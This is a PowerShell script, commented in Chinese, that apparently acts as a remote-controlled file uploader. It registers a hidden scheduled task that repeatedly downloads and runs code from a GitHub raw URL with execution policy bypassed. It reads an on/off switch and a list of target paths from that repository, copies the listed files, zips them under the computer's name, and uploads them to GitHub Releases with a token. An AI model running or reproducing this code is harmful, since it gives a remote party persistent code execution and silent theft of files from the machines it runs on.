# ===== 初始化 =====
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
$taskName = "console"
$scriptUrl = "https://raw.githubusercontent.com/$repo/main/console.ps1"

if ([string]::IsNullOrEmpty($token)) {
    Write-Host "❌ GH_TOKEN 环境变量未设置，脚本终止。"
    return
}

# ===== 自动注册计划任务（若未存在） =====
$taskExists = SCHTASKS /Query /TN $taskName 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "🛠️ 未检测到计划任务，正在注册..."

    $taskRun = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`""
    SCHTASKS /Create /TN $taskName /TR $taskRun /SC HOURLY /ST 19:30 /DU 04:30 /RI 30 /F

    if ($LASTEXITCODE -eq 0) {
        Write-Host "✅ 计划任务 '$taskName' 注册成功，将每天 19:30 至 0:00 每 30 分钟执行一次。"
    } else {
        Write-Host "❌ 计划任务注册失败。请以管理员身份运行此脚本。"
        return
    }
}

# ===== 检查开关 =====
$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        Write-Host "🛑 上传开关未启用，脚本退出。"
        return
    }
} catch {
    Write-Host "❌ 无法读取上传开关：" $_
    return
}

# ===== 获取路径列表 =====
$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"
try {
    $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
    Write-Host "`n📦 上传路径列表："
    $uploadPaths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Host "❌ 无法读取路径配置：" $_
    return
}

# ===== 拷贝文件到临时目录（尽可能包括被占用文件） =====
$tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

foreach ($path in $uploadPaths) {
    if (-not (Test-Path $path)) {
        Write-Host "⚠️ 路径不存在，跳过：$path"
        continue
    }

    $item = Get-Item $path -Force
    try {
        if ($item.PSIsContainer) {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "📁 已复制目录：$($item.FullName)"
        } else {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
            Write-Host "📄 已复制文件：$($item.FullName)"
        }
    } catch {
        Write-Warning "⚠️ 无法复制：$($item.FullName)"
    }
}

# ===== 压缩为 ZIP =====
Add-Type -AssemblyName System.IO.Compression.FileSystem
$computerName = $env:COMPUTERNAME
$tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$zipPath = "$env:TEMP\$tag.zip"
[System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)

# 清理临时目录
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# ===== 上传 ZIP 到 GitHub Release =====
$uploadUrl = "https://api.github.com/repos/$repo/releases"
$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "upload-script"
    Accept        = "application/vnd.github+json"
}

try {
    $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
        tag_name   = $tag
        name       = $tag
        draft      = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3)

    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
    Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent"   = "upload-script"
    } -InFile $zipPath

    Write-Host "`n✅ 上传成功：$tag.zip"
} catch {
    Write-Host "❌ 上传失败：" $_
}

# 清理压缩包
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
